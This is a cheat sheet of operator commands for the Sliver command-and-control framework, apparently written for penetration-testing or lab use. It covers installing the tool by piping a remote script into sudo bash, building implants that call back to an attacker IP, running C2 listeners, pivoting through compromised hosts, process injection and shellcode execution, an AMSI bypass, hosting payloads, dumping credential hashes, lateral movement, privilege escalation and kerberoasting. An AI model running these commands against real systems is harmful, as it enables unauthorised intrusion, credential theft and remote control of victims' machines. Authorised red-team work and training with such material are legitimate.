---
icon: shield-cat
---

# SLIVER

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

### Download & Installation

```bash
# Linux Installation
curl https://sliver.sh/install|sudo bash

# Manual Download - Server
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O sliver-server

# Manual Download - Client
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux -O sliver-client

# Make executable
chmod +x sliver-server sliver-client
```

### Resolve Listener Port Errors

```bash
# Check port usage
sudo lsof -i :8443

# Kill process using port
sudo kill -9 <PID>

# Or kill all sliver processes
sudo pkill -9 sliver
```

### Starting Sliver Server

```bash
# Start server (first time - creates configs)
sudo ./sliver-server

# Start with specific config
sliver-server -c /path/to/config.json

# Daemon mode
sliver-server daemon
```

### Generate Implants

```bash
# Generate Windows beacon (periodic check-in)
generate beacon --http 10.10.14.14 --save /tmp/ --os windows --arch amd64

# Generate Windows session (interactive)
generate --http 10.10.14.14 --save /tmp/ --os windows --arch amd64

# Generate Linux implant
generate --http 10.10.14.14 --save /tmp/ --os linux --arch amd64

# Generate with DNS C2
generate beacon --dns target.com --save /tmp/
```

### Start Listeners

```bash
# HTTP listener
http --lhost 0.0.0.0 --lport 80

# HTTPS listener
https --lhost 0.0.0.0 --lport 443

# mTLS listener (most secure, requires mutual TLS)
mtls --lhost 0.0.0.0 --lport 8888

# DNS listener
dns --domains target.com --lport 53

# List active listeners
jobs
```

### Session Management

```bash
# List sessions/beacons
sessions
beacons

# Interact with session
use <session-id>

# Background session
background

# Kill session
kill <session-id>

# Rename session
rename <new-name>
```

### Basic Commands (in session)

```bash
# System info
info
whoami
getuid
getpid

# File operations
ls
cd /path
download /path/to/file
upload /local/file /remote/path
cat /path/to/file

# Process operations
ps
procdump -p <pid>
migrate <pid>

# Network operations
netstat
ifconfig
```

### Pivoting & Port Forwarding

```bash
# Start SOCKS5 proxy
socks5 start

# Port forward (remote to local)
portfwd add --bind 0.0.0.0:8080 --remote 127.0.0.1:80

# List port forwards
portfwd

# Stop port forward
portfwd rm --id <id>
```

### Pivoting (Double Pivot Setup)

```bash
# On first compromised host - start pivot listener
pivots tcp --bind 0.0.0.0:9090

# Generate implant for second target pointing to first host
generate --mtls 172.16.5.10:9090 --save /tmp/

# List active pivots
pivots

# Route traffic through pivot
route add 172.16.6.0/24 <session-id>
```

### C2 Profile & Evasion

```bash
# Generate with custom C2 profile
generate beacon --http 10.10.14.14 --c2profile /path/to/profile.json

# Enable process injection
spawn <implant-path>
inject <pid>

# Execute shellcode
execute-shellcode -p <pid> /path/to/shellcode.bin

# AMSI/ETW bypass (automatic in modern versions)
armory install amsi-bypass
```

### Host a Payload Server

```bash
# Host files via Sliver's website feature
websites add-content --website test --web-path /agent.exe --content /tmp/implant.exe

# List websites
websites

# Start web server
websites start --website test --port 8080
```

### Useful Post-Exploitation

```bash
# Dump credentials
hashdump
lsadump

# Screenshot
screenshot

# Execute assembly in-memory
execute-assembly /path/to/assembly.exe args

# Execute shellcode
execute-shellcode /path/to/shellcode.bin

# Lateral movement
psexec -t <target> -u admin -p pass

# Privilege escalation
getsystem
```

### Multiplayer Mode (Team Server)

```bash
# Create operator
new-operator --name hacker --lhost 10.10.14.14

# Export config for team member
multiplayer export --output /tmp/hacker.cfg

# Connect as client
sliver-client import /tmp/hacker.cfg
sliver-client
```

### Armory (Extensions)

```bash
# Update armory
armory update

# Install extension
armory install rubeus
armory install sharphound

# Use installed tool
rubeus -- kerberoast
```

### Cleanup & Exit

```bash
# List jobs/listeners
jobs

# Stop listener
jobs kill <job-id>

# Close all sessions
sessions kill --all

# Exit
exit
```

### Traffic Routing (Like Ligolo)

```bash
# Add route via compromised host
route add 172.16.5.0/24 <session-id>

# List routes
route

# Remove route
route remove <route-id>
```

### Troubleshooting

```bash
# Check server logs
tail -f ~/.sliver/logs/sliver.log

# Verify listener status
jobs

# Test connectivity
ping <target>

# Regenerate configs
sliver-server unpack --force
```
